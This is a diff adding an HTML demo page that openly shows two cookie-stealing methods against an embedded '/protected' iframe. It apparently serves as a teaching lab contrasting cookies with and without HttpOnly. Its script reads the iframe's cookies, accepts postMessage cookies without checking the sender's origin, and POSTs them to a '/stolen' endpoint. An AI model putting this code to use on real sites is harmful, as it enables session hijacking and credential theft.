@@ -1,0 +1,85 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>Parent page (Demo)</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <style>
+    body { font-family: system-ui, "Segoe UI", Arial; margin:18px; color:#111; }
+    h1 { margin: 0 0 10px 0; font-size: 40px; }
+    h2 { margin: 16px 0 8px 0; }
+    .box { border:1px solid #e0e0e0; padding:12px; margin:14px 0; }
+    pre { background:#f6f6f6; padding:12px; white-space:pre-wrap; }
+    iframe { width:100%; height:320px; border:1px solid #ccc; }
+    a { color:#5b2a8a; }
+  </style>
+</head>
+<body>
+  <h1>Parent page (Demo)</h1>
+
+  <p>This page embeds <code>/protected</code> in an iframe and demonstrates two cookie-stealing methods:</p>
+  <ol>
+    <li><strong>Direct access</strong>: same-origin, read <code>iframe.contentWindow.document.cookie</code>.</li>
+    <li><strong>postMessage</strong>: iframe cooperates by posting its cookie to the parent (demo only).</li>
+  </ol>
+
+  <p>Try:
+    <a href="/protected" target="_blank">Vulnerable page</a>
+    |
+    <a href="/protected_safe" target="_blank">Vulnerable (HttpOnly)</a>
+  </p>
+
+  <div class="box">
+    <h2>Vulnerable page (path = /protected)</h2>
+    <p>This iframe is served at <code>/protected</code> (server sets cookie Path=/protected).</p>
+
+    <div class="box" style="margin-top:12px;">
+      <h2 style="margin-top:0;">Protected page (path = /protected)</h2>
+      <p><strong>document.cookie on this page (what JS on this page can read):</strong></p>
+      <pre id="iframeCookie">(loading)</pre>
+
+      <iframe id="victimFrame" title="Protected iframe" src="/protected"></iframe>
+    </div>
+  </div>
+
+  <h2>Received cookie (from iframe)</h2>
+  <pre id="out">(no cookies)</pre>
+
+<script>
+  // Read cookie directly from the iframe's document (works when cookie is not HttpOnly)
+  function tryDirectRead() {
+    const f = document.getElementById('victimFrame');
+    try {
+      const cw = f.contentWindow;
+      const dc = (cw && cw.document && cw.document.cookie) || '(no cookies)';
+      document.getElementById('iframeCookie').textContent = dc;
+      document.getElementById('out').textContent = 'Direct read: ' + dc;
+
+      fetch('/stolen', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ via: 'direct', cookie: dc })
+      }).catch(()=>{});
+    } catch (err) {
+      console.warn('direct read failed', err);
+      document.getElementById('out').textContent = '(direct read failed)';
+    }
+  }
+
+  // Listen for cooperative postMessage from the iframe
+  window.addEventListener('message', (e) => {
+    if (!e.data || e.data.type !== 'cookies') return;
+    const cookies = e.data.cookies || '(no cookies)';
+    document.getElementById('out').textContent = 'postMessage: ' + cookies;
+
+    fetch('/stolen', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({ via: 'postMessage', cookie: cookies })
+    }).catch(()=>{});
+  }, false);
+
+  document.getElementById('victimFrame').addEventListener('load', tryDirectRead);
+</script>
+</body>
+</html>
